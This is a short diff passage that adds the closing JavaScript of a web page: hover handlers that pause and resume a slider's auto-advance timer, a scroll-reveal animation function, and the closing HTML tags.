+document.querySelector('.slider-container').addEventListener('mouseenter', () => {
+  clearInterval(autoSlideInterval);
+});
+document.querySelector('.slider-container').addEventListener('mouseleave', () => {
+  autoSlideInterval = setInterval(nextSlide, 7000);
+});
+
+// ── SCROLL REVEAL ANIMATIONS ──────────────────────────────────────────────────
+function revealOnScroll() {
+  const reveals = document.querySelectorAll('.reveal');
+  const windowHeight = window.innerHeight;
+  reveals.forEach(el => {
+    const elementTop = el.getBoundingClientRect().top;
+    if (elementTop < windowHeight - 100) {
+      el.classList.add('active');
+    }
+  });
+}
+
+window.addEventListener('scroll', revealOnScroll);
+revealOnScroll();
+</script>
+</body>
+</html>
